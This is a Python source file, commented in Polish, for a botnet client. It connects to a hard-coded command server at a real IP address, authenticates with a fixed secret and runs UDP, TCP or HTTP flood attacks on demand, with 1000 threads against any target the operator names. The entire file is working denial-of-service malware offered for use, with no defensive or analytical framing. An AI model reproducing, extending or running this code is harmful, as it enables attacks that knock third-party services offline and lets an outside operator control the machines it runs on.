import socket
import time
import random
import threading
import ssl
import sys
import os

class DDoS:
    def __init__(self, target_ip, target_port, duration, threads, method="UDP"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.method = method.upper()
        self.timeout = time.time() + duration
        self.stop_event = threading.Event()

    def generate_payload(self, size=1024):
        return random._urandom(size)

    def udp_flood(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = self.generate_payload()
        while time.time() < self.timeout and not self.stop_event.is_set():
            try:
                client.sendto(payload, (self.target_ip, self.target_port))
            except:
                pass
        client.close()

    def tcp_flood(self):
        payload = self.generate_payload(512)
        while time.time() < self.timeout and not self.stop_event.is_set():
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(1)
                client.connect((self.target_ip, self.target_port))
                client.send(payload)
                client.close()
            except:
                pass

    def http_flood(self):
        while time.time() < self.timeout and not self.stop_event.is_set():
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(1)
                client.connect((self.target_ip, self.target_port))
                
                user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
                
                if self.target_port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    client = context.wrap_socket(client, server_hostname=self.target_ip)
                
                client.send(request.encode())
                client.close()
            except:
                pass

    def run(self):
        print(f"[*] Atakuje ({self.method}) {self.target_ip}:{self.target_port} na {self.threads} watkach!")
        attack_func = None
        if self.method == "UDP":
            attack_func = self.udp_flood
        elif self.method == "TCP":
            attack_func = self.tcp_flood
        elif self.method == "HTTP":
            attack_func = self.http_flood

        for _ in range(self.threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()

        try:
            while time.time() < self.timeout:
                time.sleep(1)
        except:
            pass

def connect_to_master(master_ip, master_port):
    print(f"======================================")
    print(f"   [!] BOT URUCHOMIONY W KONSOLI [!]")
    print(f"======================================")
    print(f"[*] Szukam Mastera na {master_ip}:{master_port}...")
    
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10) # Zabezpieczenie przed zawieszeniem
            client.connect((master_ip, master_port))
            client.settimeout(None) # Po połączeniu zdejmujemy limit
            
            print(f"[*] Polaczono z Masterem! Trwa autoryzacja...")
            
            # Autoryzacja bota
            client.recv(1024) 
            client.send(b"bot_secret_xyz\n")
            
            print(f"[*] Autoryzacja udana. Czekam na rozkazy w tle...")
            
            while True:
                cmd = client.recv(1024).decode('utf-8').strip()
                if not cmd:
                    print("[!] Master zerwal polaczenie.")
                    break
                    
                if cmd == "PING":
                    continue
                
                print(f">>> OTRZYMANO ROZKAZ: {cmd} <<<")
                parts = cmd.split()
                if len(parts) >= 4:
                    method = parts[0].upper()
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    duration = int(parts[3])
                    threads = 1000 # MAX POWER
                    
                    ddos = DDoS(target_ip, target_port, duration, threads, method)
                    t = threading.Thread(target=ddos.run)
                    t.daemon = True
                    t.start()
                    print(f"[*] Uderzenie {method} odpalone na pelnej mocy!")
                    
        except Exception as e:
            print(f"[!] Blad polaczenia: {e}. Ponawiam za 5s...")
            time.sleep(5)

if __name__ == '__main__':
    # ==========================================
    # KONFIGURACJA BOTA (Wpisz tu dane Mastera!)
    # ==========================================
    MASTER_IP = "93.115.101.182"  # <- Adres twojego serwera Wispbyte
    MASTER_PORT = 11290       # <- Port twojego serwera Wispbyte
    
    connect_to_master(MASTER_IP, MASTER_PORT)
